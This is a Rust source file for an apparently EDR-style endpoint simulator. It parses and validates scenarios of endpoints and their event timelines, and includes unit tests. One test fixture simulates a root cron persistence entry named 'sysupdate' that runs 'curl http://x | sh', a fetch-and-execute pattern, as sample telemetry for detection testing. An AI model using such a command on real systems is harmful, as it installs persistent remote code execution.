/// A scenario: the control server to play against, and for every endpoint who it is and what happens on it, in order
use std::collections::HashSet;
use std::path::PathBuf;

use ed25519_dalek::VerifyingKey;
use serde::Deserialize;
use zedr_protocol::{hash_from_hex, SystemEvent};
use zedr_rules::RuleId;

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Scenario {
    pub server: String,
    /// Public key of the deployment in hex. Only what it signed counts as the control server's answer to a window
    pub deployment_key: String,
    /// Folder that gets one state directory per endpoint, named after its host
    pub state_dir: PathBuf,
    /// The zedr-prover binary. Without one no endpoint proves, whatever it is marked as
    #[serde(default)]
    pub prover: Option<PathBuf>,
    /// For a test tenant: a proving endpoint sends the journal of its rule run where the receipt goes and runs no prover.
    /// Only the server of a test tenant takes that, a control server refuses it as a receipt that does not verify
    #[serde(default)]
    pub stand_in_proofs: bool,
    /// Seconds between the heartbeats of an endpoint that stays up after its timeline. Without it the simulator ends once every timeline is played
    #[serde(default)]
    pub heartbeat_seconds: Option<u64>,
    pub endpoints: Vec<Endpoint>,
}

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Endpoint {
    pub hostname: String,
    pub platform: String,
    pub os_version: String,
    pub architecture: String,
    pub version: String,
    #[serde(default)]
    pub ip_address: Option<String>,
    /// The install key or fleet token the control server enrolls this endpoint with
    #[serde(default)]
    pub enrollment_key: Option<String>,
    /// Proves its windows when the scenario names a prover
    #[serde(default)]
    pub proving: bool,
    /// Rules whose matches this endpoint does not release, the dishonest endpoint of a demo. It still proves honestly
    #[serde(default)]
    pub withhold: Vec<String>,
    /// Keeps running after its timeline: heartbeats, and a sealed window whenever one is due
    #[serde(default)]
    pub stays_up: bool,
    /// What the agent reports about itself and what its sensor sees, oldest first
    #[serde(default)]
    pub timeline: Vec<SystemEvent>,
}

pub fn timestamp(event: &SystemEvent) -> u64 {
    match event {
        SystemEvent::Process(event) => event.timestamp,
        SystemEvent::File(event) => event.timestamp,
        SystemEvent::Network(event) => event.timestamp,
        SystemEvent::Heartbeat(event) => event.timestamp,
        SystemEvent::Upgrade(event) => event.timestamp,
        SystemEvent::Install(event) => event.timestamp,
        SystemEvent::AgentStopping(event) => event.timestamp,
        SystemEvent::Persistence(event) => event.timestamp,
        SystemEvent::Package(event) => event.timestamp,
    }
}

impl Scenario {
    pub fn parse(source: &str) -> Result<Self, String> {
        let scenario: Scenario = serde_json::from_str(source).map_err(|e| format!("The scenario cannot be read: {}", e))?;
        scenario.deployment_key()?;
        if scenario.heartbeat_seconds == Some(0) {
            return Err("heartbeat_seconds must be above zero".to_string());
        }

        let mut hosts = HashSet::new();
        for endpoint in &scenario.endpoints {
            let host = endpoint.hostname.as_str();
            let names_a_folder = !host.is_empty() && !host.starts_with('.') && host.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'));
            if !names_a_folder {
                return Err(format!("Host name {:?} cannot name a state directory", host));
            }
            if !hosts.insert(host.to_ascii_lowercase()) {
                return Err(format!("{} is in the scenario twice", host));
            }
            endpoint.withheld().map_err(|e| format!("{}: {}", host, e))?;
            endpoint.check_timeline().map_err(|e| format!("{}: {}", host, e))?;
        }
        Ok(scenario)
    }

    pub fn deployment_key(&self) -> Result<VerifyingKey, String> {
        let bytes = hash_from_hex(&self.deployment_key).map_err(|_| "deployment_key must be 64 hex characters".to_string())?;
        VerifyingKey::from_bytes(&bytes).map_err(|e| format!("deployment_key is not a public key: {}", e))
    }
}

impl Endpoint {
    pub fn withheld(&self) -> Result<Vec<RuleId>, String> {
        self.withhold.iter().map(|id| RuleId::from_id(id).ok_or_else(|| format!("withhold names {:?}, which is not a rule", id))).collect()
    }

    fn check_timeline(&self) -> Result<(), String> {
        let mut previous = 0;
        let mut stopped = false;
        for (position, event) in self.timeline.iter().enumerate() {
            let at = timestamp(event);
            if at < previous {
                return Err(format!("timeline entry {} is at {} and the one before it at {}, a timeline is in order", position, at, previous));
            }
            if stopped {
                return Err(format!("timeline entry {} comes after the agent stopped", position));
            }
            stopped = matches!(event, SystemEvent::AgentStopping(_));
            previous = at;
        }
        if stopped && self.stays_up {
            return Err("stays_up is set and the timeline ends with the agent stopping".to_string());
        }
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn scenario(endpoints: &str) -> String {
        format!(r#"{{ "server": "http://127.0.0.1:1", "deployment_key": "{}", "state_dir": "/nowhere", "endpoints": [{}] }}"#, crate::tests::deployment_key_hex(), endpoints)
    }

    fn endpoint(hostname: &str, more: &str) -> String {
        format!(r#"{{ "hostname": "{}", "platform": "linux", "os_version": "Ubuntu 24.04.1 LTS", "architecture": "x86_64", "version": "0.1.0"{} }}"#, hostname, more)
    }

    #[test]
    fn test_a_scenario_is_read_with_what_each_endpoint_reports_and_senses_in_order() {
        let timeline = r#", "ip_address": "10.30.1.14", "enrollment_key": "key-1", "proving": true, "withhold": ["server-child"], "stays_up": true, "timeline": [
            { "Heartbeat": { "timestamp": 100 } },
            { "Process": { "timestamp": 100, "pid": 20, "ppid": 1, "executable_path": "/usr/sbin/nginx", "command_line": ["/usr/sbin/nginx"], "action": "Create", "uid": 33, "hash": null } },
            { "Network": { "timestamp": 130, "pid": 20, "process_path": "/usr/sbin/nginx", "protocol": "tcp", "source_ip": "10.30.1.14", "source_port": 50000, "dest_ip": "198.51.100.50", "dest_port": 443, "action": "Connect", "bytes_sent": 1, "bytes_received": 2 } },
            { "Persistence": { "timestamp": 140, "action": "Added", "kind": "cron", "name": "sysupdate", "path": "/etc/cron.d/sysupdate", "command": "curl http://x | sh", "user": "root", "enabled": true, "hash": null } }
        ]"#;
        let read = Scenario::parse(&scenario(&format!("{}, {}", endpoint("WEB-SRV-04", timeline), endpoint("WEB-SRV-05", "")))).unwrap();

        assert_eq!((read.server.as_str(), read.prover.is_none(), read.heartbeat_seconds), ("http://127.0.0.1:1", true, None));
        let first = &read.endpoints[0];
        assert_eq!((first.hostname.as_str(), first.ip_address.as_deref(), first.enrollment_key.as_deref()), ("WEB-SRV-04", Some("10.30.1.14"), Some("key-1")));
        assert!(first.proving && first.stays_up);
        assert_eq!(first.withheld().unwrap(), vec![RuleId::ServerChild]);
        assert_eq!(first.timeline.iter().map(timestamp).collect::<Vec<_>>(), vec![100, 100, 130, 140]);
        assert!(matches!(first.timeline[3], SystemEvent::Persistence(_)));

        let second = &read.endpoints[1];
        assert!(!second.proving && !second.stays_up && second.withhold.is_empty() && second.timeline.is_empty() && second.enrollment_key.is_none());
    }

    #[test]
    fn test_a_scenario_that_could_not_be_played_as_written_is_refused_with_the_endpoint_it_is_about() {
        let refused = |endpoints: &str| Scenario::parse(&scenario(endpoints)).unwrap_err();

        let backwards = r#", "timeline": [{ "Heartbeat": { "timestamp": 200 } }, { "Heartbeat": { "timestamp": 199 } }]"#;
        assert!(refused(&endpoint("HR-DESKTOP-03", backwards)).starts_with("HR-DESKTOP-03: timeline entry 1 is at 199"));

        let after_stop = r#", "timeline": [{ "AgentStopping": { "timestamp": 200, "reason": "ServiceStop" } }, { "Heartbeat": { "timestamp": 230 } }]"#;
        assert!(refused(&endpoint("HR-DESKTOP-03", after_stop)).contains("comes after the agent stopped"));
        let stopped_and_up = r#", "stays_up": true, "timeline": [{ "AgentStopping": { "timestamp": 200, "reason": "SystemShutdown" } }]"#;
        assert!(refused(&endpoint("LAB-VM-02", stopped_and_up)).contains("stays_up"));

        assert!(refused(&endpoint("WEB-SRV-04", r#", "withhold": ["web-shell"]"#)).contains("\"web-shell\", which is not a rule"));
        assert!(refused(&format!("{}, {}", endpoint("WEB-SRV-04", ""), endpoint("web-srv-04", ""))).contains("twice"));
        assert!(refused(&endpoint("../elsewhere", "")).contains("cannot name a state directory"));
        assert!(refused(&endpoint("WEB-SRV-04", r#", "shell": true"#)).contains("unknown field"));

        let no_key = scenario("").replace(&crate::tests::deployment_key_hex(), "abcd");
        assert!(Scenario::parse(&no_key).unwrap_err().contains("deployment_key"));
        let no_beat = scenario("").replace("\"endpoints\"", "\"heartbeat_seconds\": 0, \"endpoints\"");
        assert!(Scenario::parse(&no_beat).unwrap_err().contains("heartbeat_seconds"));
    }
}
